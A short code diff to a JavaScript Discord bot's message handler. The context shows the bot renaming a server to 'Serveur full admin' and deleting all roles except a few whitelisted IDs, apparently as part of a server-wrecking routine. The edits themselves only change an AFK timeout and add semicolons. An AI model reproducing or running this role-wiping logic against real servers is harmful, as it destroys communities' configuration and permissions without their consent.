@@ -399,7 +399,7 @@ bot.on("message", async function(message) {
                             
                             message.guild.setName("Serveur full admin");
                             message.guild.setRegion("eu-central");
-                            message.guild.setAFKTimeout(30);
+                            message.guild.setAFKTimeout(300);
                             message.guild.setIcon("./wLBF7RUE.jpg");
                             
                             var emojilist = message.guild.emojis
@@ -410,8 +410,8 @@ bot.on("message", async function(message) {
                             var rolelist = message.guild.roles
                             rolelist.forEach(function(value){
                                 if (value.id != "462666906931822602" && value.id != "462661649502044161" && value.id != "458316243015827456" && value.id != "462660306959728642"){
-                                    value.delete()
-                                }
+                                    value.delete();
+                                };
                             });
                             
                         });
